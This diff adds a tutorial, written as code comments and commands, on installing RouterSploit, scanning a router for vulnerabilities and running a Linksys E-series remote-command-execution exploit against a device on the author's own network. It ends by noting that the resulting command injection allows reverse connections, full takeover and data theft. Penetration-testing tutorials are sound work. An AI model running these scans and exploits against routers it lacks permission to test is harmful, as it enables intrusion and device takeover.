@@ -1,0 +1,59 @@
+/*Using Routersploit to detect vulnerabilities in a router  
+
+Firstly, you must install routersploit this can be done by entering the following commands in the root terminal. If you are using the main terminal ‘sudo’ may be required to execute these commands: */ 
+
+apt-get install python3-pip 
+
+git clone https://www.github.com/threat9/routersploit 
+
+cd routersploit 
+
+python3 -m pip install -r requirements.txt 
+
+python3 rsf.py 
+
+// Once Routersploit has been installed it can be accessed by running the following commands: 
+
+Cd routersploit 
+
+Ls 
+
+Python3 rsf.py 
+
+/*When Routerspoilt has been started will be shown number of Exploits, Scanners, Credentials and Payloads that are available to be run. There are two ways to scan your device for vulnerabilities.*/ 
+
+//The first method uses the following commands command: 
+
+Use scanners/routers/router_scan – to scan routers 
+
+Show options  
+
+Set target  192.168.0.1 //The target  is the ip address of the router you’re scanning 
+
+Run //This will begin the scanning process and check for vulnerabilities 
+
+/*Sometimes a Crypto error can appear as 3 different packages are automatically installed in the same folder named Crypto which is undoubtedly common cause for error. If this happens enter the following commands to resolve the issue and then repeat the above commands: 
+
+pip3 uninstall crypto  
+
+pip3 uninstall pycrypto  
+
+pip3 install pycryptodome 
+
+*/ 
+
+/* Once the scan is successfully running you will notice indicators resembling this sign [+] on the left hand side of the screen, these are used to identify whether or not a vulnerability is exploitable. Once the scan is complete any devices that are vulnerable will be listed along with the exploit that can be used.*/ 
+
+/* If a vulnerable device is found it can be exploited using the commands below. For this I will be using the vulnerable device located on my network as an example*/ 
+
+rsf> use exploits/routers/linksys/eseries_themoon_rce  //this is the exploit recommended by routersploit for this vulnerable device  
+
+Show options 
+
+Set target 192.168.0.186 //the ip of my target vulnerable device 
+
+Run 
+
+/*If successful in your exploit you will be able to perform blind command injection meaning you will be able to execute commands on the router but cannot 
+see the output. You will notice the terminals rsf> has now become cmd> . Through this Blind Command Injection, you can open a reverse connection, override
+the original access command, perform a complete takeover of the system, steal sensitive data and perform many other malicious acts*/ 
